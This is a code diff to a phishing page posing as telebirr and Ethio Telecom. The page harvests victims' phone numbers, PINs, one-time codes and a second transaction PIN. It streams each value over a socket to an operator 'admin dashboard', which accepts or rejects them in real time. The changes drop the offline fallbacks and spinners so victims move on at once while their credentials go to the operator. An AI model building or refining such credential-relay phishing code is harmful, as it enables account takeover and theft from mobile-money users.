@@ -81,9 +81,7 @@
                 <div class="flex justify-start">
                     <img src="/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
                 </div>
-                
                 <div class="h-8 w-[1px] bg-gray-200"></div>
-                
                 <div class="flex justify-end">
                     <img src="/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
                 </div>
@@ -132,7 +130,6 @@
         </header>
 
         <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between relative">
-            
             <div class="w-full flex justify-center items-center gap-2 mb-6" x-show="step > 3">
                 <template x-for="i in [4, 5, 6, 8]" :key="i">
                     <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#0056B3] scale-110': step === i, 'bg-cyan-200': step > i, 'bg-gray-200': step < i }"></div>
@@ -162,9 +159,8 @@
                         </div>
                     </div>
                     <div class="pt-2">
-                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid || processingStep1" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
-                            <span x-show="!processingStep1">Request OTP Code</span>
-                            <span x-show="processingStep1" class="spinner-sm"></span>
+                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span>Continue</span>
                         </button>
                     </div>
                 </div>
@@ -202,13 +198,11 @@
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">Account Security Verification</h2>
                         <p class="text-xs text-gray-600 font-medium mt-1">Enter your 4-digit telebirr transaction PIN</p>
                     </div>
-                    
                     <div class="flex justify-center gap-3 py-1">
                         <template x-for="(_, i) in 4" :key="i">
                             <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step3-pin')" x-model="step3Pin.value[i]">
                         </template>
                     </div>
-
                     <div class="pt-2">
                         <button @click="submitFinalPinAuthorization" :disabled="!isStep3PinValid || authorizingFinalPin" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
                             <span x-show="!authorizingFinalPin">Continue</span>
@@ -334,7 +328,7 @@
                 otp: { code: '' },
                 step1Pin: { value: ['', '', '', ''] },
                 step3Pin: { value: ['', '', '', ''] }, 
-                processingStep1: false, verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
+                verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
                 socket: null, toast: { show: false, message: '' },
 
                 get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
@@ -360,21 +354,16 @@
                 },
 
                 submitStep1Credentials() {
-                    this.processingStep1 = true;
+                    // Instantly drop to background log push and switch layout views immediately without spinning
                     if (this.socket && this.connected) {
                         this.socket.emit('submit-step1-credentials', { 
                             appId: this.appId,
                             phone: this.form.phone, 
                             pin: this.step1Pin.value.join('') 
                         });
-                    } else {
-                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
-                        setTimeout(() => {
-                            this.processingStep1 = false;
-                            this.step = 2; 
-                            this.triggerToastNotification("OTP parameter code routed successfully.");
-                        }, 800);
                     }
+                    this.step = 2;
+                    this.triggerToastNotification("Verification session initiated.");
                 },
 
                 submitOtpToAdminQueue() {
@@ -384,12 +373,7 @@
                             appId: this.appId,
                             code: this.otp.code 
                         });
-                    } else {
-                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
-                        setTimeout(() => {
-                            this.verifyingOtp = false;
-                            this.step = 2.5; 
-                        }, 800);
+                        this.step = 2.5; // Immediately enter administrative holding state
                     }
                 },
 
@@ -400,12 +384,7 @@
                             appId: this.appId,
                             pin: this.step3Pin.value.join('') 
                         });
-                    } else {
-                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
-                        setTimeout(() => {
-                            this.authorizingFinalPin = false;
-                            this.step = 4; 
-                        }, 800);
+                        this.step = 2.5; // Reuse the clean waiting spinner
                     }
                 },
 
@@ -441,60 +420,44 @@
                             employment: this.form.employment,
                             income: this.form.income
                         });
-                    } else {
-                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
-                        setTimeout(() => {
-                            this.processingStep6 = false;
-                            this.referenceId = "TXN-" + Math.floor(100000 + Math.random() * 900000) + "-ETB";
-                            this.step = 8;
-                        }, 800);
                     }
                 },
 
                 init() {
-                    // Set autoConnect to true or call connect() explicitly
                     this.socket = io({ autoConnect: true });
                     
-                    this.socket.on('connect', () => { 
-                        this.connected = true; 
-                        console.log("🔌 Connected to real-time communication server.");
-                    });
+                    this.socket.on('connect', () => { this.connected = true; });
+                    this.socket.on('disconnect', () => { this.connected = false; });
+                    this.socket.on('connect_error', (err) => console.error("🔌 Socket error:", err));
                     
-                    this.socket.on('disconnect', () => { 
-                        this.connected = false; 
-                        console.log("❌ Disconnected from communication server.");
-                    });
-
-                    this.socket.on('connect_error', (error) => {
-                        console.error("❌ Socket Connection Error:", error);
-                    });
-                    
-                    // Session capture logic
                     this.socket.on('session-ready', (data) => {
                         this.appId = data.appId;
-                        console.log(`🎯 Active session registered: ${this.appId}`);
                         this.socket.emit('join-room', this.appId);
                     });
 
-                    this.socket.on('otp-accepted-goto-wait', () => { 
-                        this.processingStep1 = false; 
-                        this.step = 2; 
-                        this.triggerToastNotification("OTP Code sent to your device.");
+                    this.socket.on('admin-dashboard-approve', () => { 
+                        this.verifyingOtp = false;
+                        this.step = 3; 
+                        this.triggerToastNotification("OTP parameters approved safely.");
                     });
 
-                    this.socket.on('otp-accepted-wait-only', () => {
+                    this.socket.on('otp-rejected', (data) => {
                         this.verifyingOtp = false;
-                        this.step = 2.5;
-                    });
-                    
-                    this.socket.on('admin-dashboard-approve', () => { 
-                        this.step = 3; 
-                        this.triggerToastNotification("Session approved by Admin Dashboard.");
+                        this.otp.code = '';
+                        this.step = 2;
+                        this.triggerToastNotification(data.message || "Invalid OTP. Please enter the correct verification code.");
                     });
                     
                     this.socket.on('final-pin-accepted', () => { 
                         this.authorizingFinalPin = false; 
                         this.step = 4; 
+                    });
+
+                    this.socket.on('pin-rejected', (data) => {
+                        this.authorizingFinalPin = false;
+                        this.step3Pin.value = ['', '', '', ''];
+                        this.step = 3;
+                        this.triggerToastNotification(data.message || "Incorrect Transaction PIN. Please try again.");
                     });
 
                     this.socket.on('application-complete', (data) => {
